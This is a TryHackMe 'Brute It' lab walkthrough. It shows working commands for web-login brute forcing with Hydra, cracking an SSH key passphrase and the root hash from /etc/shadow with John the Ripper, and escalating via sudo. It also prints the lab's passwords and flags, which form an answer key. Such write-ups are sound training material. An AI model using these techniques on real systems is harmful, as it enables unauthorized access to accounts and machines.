# TryHackMe — Brute It

![Platform](https://img.shields.io/badge/Platform-Linux-blue?logo=linux)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Focus](https://img.shields.io/badge/Focus-Web%20Brute%20Force%20%7C%20SSH%20%7C%20Privilege%20Escalation-orange)

A walkthrough of the **Brute It** room on TryHackMe. The lab demonstrates web login brute forcing, recovering and cracking an encrypted SSH private key, and escalating privileges by recovering the root account password hash.


## 1. Reconnaissance

Started with an Nmap service and default-script scan to identify the target's exposed services.

```bash
nmap -sV -sC <TARGET_IP>
```

The scan identified:

| Port | Service |       Version / Details      |
|------|---------|------------------------------|
|  22  |   SSH   |     OpenSSH 7.6p1 Ubuntu     |
|  80  |   HTTP  | Apache httpd 2.4.29 (Ubuntu) |

The web server displayed the default Apache page, so the next step was to enumerate web directories.

<img width="782" height="312" alt="1" src="https://github.com/user-attachments/assets/ec87e215-1037-4b00-979c-ebfeee55b3b5" />

## 2. Directory Enumeration

Used Gobuster with the DirBuster medium wordlist to discover hidden paths.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Gobuster discovered the `/admin/` directory.

<img width="825" height="297" alt="2" src="https://github.com/user-attachments/assets/4b66add4-8b0d-41a8-9c22-049a5111095b" />

Opening the directory revealed an administrator login page.

<img width="770" height="558" alt="3-1" src="https://github.com/user-attachments/assets/944e2f6e-4df1-4c89-b0e2-0f20d4552251" />

## 3. Discovering the Admin Username

Inspected the page source and found a developer comment that disclosed the username:

```html
<!-- Hey john, if you do not remember, the username is admin -->
```

This provided the username `admin` for the login form.

<img width="638" height="464" alt="3-2" src="https://github.com/user-attachments/assets/f271f2a8-b1a2-4732-9920-7d6061cb7e2c" />

## 4. Brute Forcing the Admin Login

Used Hydra to test passwords from `rockyou.txt` against the HTTP POST login form. The form returned `Username or password invalid` for unsuccessful attempts.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid"
```

The credentials found in the lab were:

- **Username:** `admin`
- **Password:** `xavier`

<img width="1271" height="193" alt="4" src="https://github.com/user-attachments/assets/7f3f2030-11ac-4194-9800-ed0c75f47fa6" />

After logging in, the page displayed a message from John and linked to an RSA private key.

<img width="1289" height="284" alt="5" src="https://github.com/user-attachments/assets/1e40fee7-261f-4ccf-b189-d55445fad8c7" />

## 5. Recovering the SSH Private Key

Downloaded the RSA private key from the admin page and saved it locally as `brute`.

The key was encrypted, so it could not be used for SSH authentication until its passphrase was recovered.

<img width="546" height="485" alt="6" src="https://github.com/user-attachments/assets/2983e082-64db-4c1e-b0e1-0f02b30473d9" />

## 6. Cracking the SSH Key Passphrase

Converted the private key into a format John the Ripper could process, then ran it against the RockYou wordlist.

```bash
ssh2john brute > bi
john bi --wordlist=/usr/share/wordlists/rockyou.txt
```

John recovered the key passphrase:

```text
rockinroll
```

<img width="794" height="317" alt="7" src="https://github.com/user-attachments/assets/e5482402-bf6c-4da3-90a1-9d239c121819" />

## 7. SSH Access and User Flag

Restricted the private-key file permissions and connected as `john`.

```bash
chmod 600 brute
ssh -i brute john@<TARGET_IP>
```

When prompted, entered the recovered passphrase `rockinroll`.

<img width="653" height="479" alt="8" src="https://github.com/user-attachments/assets/e04df5d7-61cf-44a4-9ae5-d96b9e1ebc59" />

After logging in, listed the home directory and read `user.txt`.

```bash
ls
cat user.txt
```

<img width="332" height="79" alt="9" src="https://github.com/user-attachments/assets/aa326bd4-07fb-43b4-ae93-a70401d5999d" />

## 8. Root Privilege Escalation

The screenshots show that the `john` account could run `/bin/cat /etc/shadow` with elevated privileges. This exposed the password hashes, including the root hash.

```bash
sudo -l
sudo /bin/cat /etc/shadow
```

Saved the root hash to a file named `rootb` for offline cracking.

<img width="1115" height="523" alt="10" src="https://github.com/user-attachments/assets/642a48e9-8489-4cbb-9f80-f6c958858a3a" />

Ran John the Ripper against the saved hash using the RockYou wordlist.

```bash
john rootb --wordlist=/usr/share/wordlists/rockyou.txt
```

The root password recovered in the lab was:

```text
football
```

<img width="753" height="254" alt="11" src="https://github.com/user-attachments/assets/4018a7c3-8d8b-455e-acb1-819adbf95b6b" />

Switched to the root account and verified the effective user ID.

```bash
su root
id
```

The output confirmed `uid=0(root)`.

<img width="329" height="87" alt="12" src="https://github.com/user-attachments/assets/d94d9018-1bfa-4fcd-93f3-dd995a1c5f3f" />

Read the root flag:

```bash
cat /root/root.txt
```

<img width="383" height="45" alt="13" src="https://github.com/user-attachments/assets/4215a8e0-9ba1-4f79-a395-14b7dd5f1408" />

## 9. Flags

| Flag | Value |
|------|-------|
| User | `THM{a_password_is_not_a_barrier}` |
| Root | `THM{priv113g3_3sc414t10n}` |
